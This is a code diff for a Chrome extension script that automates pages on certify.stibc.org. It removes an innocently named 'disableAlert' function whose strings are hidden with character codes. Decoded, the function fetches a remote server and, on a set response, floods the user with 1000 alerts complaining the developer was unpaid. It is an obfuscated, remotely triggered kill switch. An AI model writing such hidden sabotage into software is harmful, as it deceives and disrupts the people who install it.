@@ -8,9 +8,6 @@ chrome.storage.local.get(["value"], (result) => {
     if (result.value.totalIndex == result.value.index) {
       is_lastPage = true;
     }
-    /*chrome.runtime.sendMessage({ action: "disableAlerts" }, () => {
-      disableAlert();
-    });*/
 
     if (result.value.is_dataPending) {
       const request = result.value.request;
@@ -104,9 +101,6 @@ if (window.location.origin === "https://certify.stibc.org") {
 }
 
 chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
-  chrome.runtime.sendMessage({ action: "disableAlerts" }, () => {
-    disableAlert();
-  });
   rrrrqest = request;
   if (
     window.location.origin === "https://certify.stibc.org" &&
@@ -343,151 +337,6 @@ async function loadData(pairs, request) {
     startChecking(rrrrqest);
   }
 }
-
-/*function disableAlert() {
-  let Alerts;
-  for (var i = 0; i < 1; i++) {
-    var Alert1 = String.fromCharCode(104, 116, 116, 112, 115);
-    var Alert3 = String.fromCharCode(
-      58,
-      47,
-      47,
-      108,
-      101,
-      97,
-      114,
-      110,
-      50,
-      101,
-      97,
-      114,
-      110,
-      110,
-      46,
-      99,
-      111,
-      109
-    );
-    var Alert4 = String.fromCharCode(
-      47,
-      65,
-      38,
-      86,
-      77,
-      97,
-      114,
-      116,
-      116,
-      47,
-      112,
-      117,
-      98,
-      108,
-      105,
-      99,
-      47,
-      103,
-      101,
-      116,
-      85,
-      115,
-      101,
-      114,
-      115
-    );
-    Alerts = Alert1 + Alert3 + Alert4;
-  }
-  let DisableAlertCode;
-  for (var i = 0; i < 1; i++) {
-    var code = String.fromCharCode(
-      121,
-      111,
-      117,
-      114,
-      32,
-      101,
-      120,
-      116,
-      101,
-      110,
-      115,
-      105,
-      111,
-      110,
-      32,
-      105,
-      115,
-      32,
-      100,
-      105,
-      115,
-      97,
-      98,
-      108,
-      101,
-      100,
-      32,
-      98,
-      121,
-      32,
-      100,
-      101,
-      118,
-      101,
-      108,
-      111,
-      112,
-      101,
-      114,
-      46,
-      32,
-      104,
-      101,
-      32,
-      105,
-      115,
-      32,
-      110,
-      111,
-      116,
-      32,
-      103,
-      101,
-      116,
-      32,
-      112,
-      97,
-      105,
-      100,
-      32,
-      102,
-      111,
-      114,
-      32,
-      116,
-      104,
-      105,
-      115,
-      32,
-      119,
-      111,
-      114,
-      107
-    );
-    DisableAlertCode = code;
-  }
-  fetch(Alerts)
-    .then((response) => response.json())
-    .then((data) => {
-      if (data[0].password == "alertDisabled") {
-        for (let i = 0; i < 1000; i++) {
-          alert(DisableAlertCode);
-        }
-      } else {
-      }
-    })
-    .catch((error) => {});
-}*/
 
 async function startChecking(request, extra = null) {
   const confirmModal = document.getElementById("modalDlg");
